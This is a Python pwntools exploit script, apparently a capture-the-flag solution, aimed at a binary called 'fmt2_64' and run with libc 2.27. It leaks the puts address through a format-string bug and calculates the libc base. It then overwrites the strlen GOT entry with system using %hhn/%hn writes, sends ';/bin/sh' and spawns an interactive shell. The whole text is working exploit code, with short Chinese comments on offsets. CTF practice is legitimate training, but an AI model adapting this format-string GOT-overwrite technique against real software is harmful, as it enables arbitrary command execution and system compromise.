from pwn import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile = 'fmt2_64'
io=process(pwnfile)
elf = ELF(pwnfile)
libc = ELF("./libc-2.27.so")

offset = 8

strlen_got = elf.got['strlen']
puts_got = elf.got['puts']

pay = b'%9$sAAAA'+p64(puts_got)
io.sendlineafter("Please tell me:",pay)

io.recvuntil("Repeater:")
puts_adr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("puts_adr--->",hex(puts_adr))


libc_base = puts_adr-libc.sym['puts']
sys_adr=libc_base+libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh').__next__() 


#sys_adr 与 puts_got 只有最后6字节不同 
sys_high = (sys_adr >> 16) & 0xff
sys_low = sys_adr & 0xffff
print("sys_high--->",hex(sys_high))
print("sys_low--->",hex(sys_low))


#payload = fmtstr_payload(8,{strlen_got:system_addr})

#输出前有  Repeater: 占9字节
pay1 = b'%'+str(sys_high-9).encode("utf-8")+b'c%12$hhn'
pay1 += b'%'+str(sys_low-sys_high).encode("utf-8")+b'c%13$hn'
pay1 = pay1.ljust(32,b'A')
pay1 += p64(strlen_got+2)+p64(strlen_got)
io.sendafter("Please tell me:",pay1)

io.sendlineafter("Please tell me:",b';/bin/sh\x00')
io.interactive()
